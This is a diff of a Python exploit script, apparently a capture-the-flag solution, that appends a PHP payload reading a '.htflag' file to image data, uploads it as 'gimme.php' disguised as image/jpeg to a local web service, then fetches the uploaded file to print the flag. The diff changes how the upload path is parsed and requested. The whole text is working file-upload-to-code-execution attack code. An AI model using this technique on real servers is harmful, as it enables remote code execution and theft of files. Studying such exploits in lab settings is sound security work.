@@ -11,14 +11,14 @@ imageLength = len(imageContent.getvalue())
 imageContent.write(b'<?php echo file_get_contents("../.htflag");')
 
 response = requests.post('http://127.0.0.1:8080/index.php',
-        files={'uploadedfile': ('gimme.php', imageContent.getvalue(), 'image/jpeg')},
-        data={'filename': 'gimme.php'})
+        files={'uploadedfile': ('gimme.php', imageContent.getvalue(), 'image/jpeg')})
 
 if ' has been uploaded' in response.text:
-    path = re.findall(r"\[\+\] ([^ ]+) has been uploaded",
+    path = re.findall(
+            r'\[\+\] <a href=\'([^\']+)\'>.*</a> has been uploaded',
             response.text)[0]
     print(f'[+] Injection done: {path}')
-    response = requests.get(f'http://127.0.0.1:8080/{path}')
+    response = requests.get(f'http://127.0.0.1:8080{path}')
     print(f'>>> {response.text[imageLength:]}')
 else:
     print("[-] Injection failed")
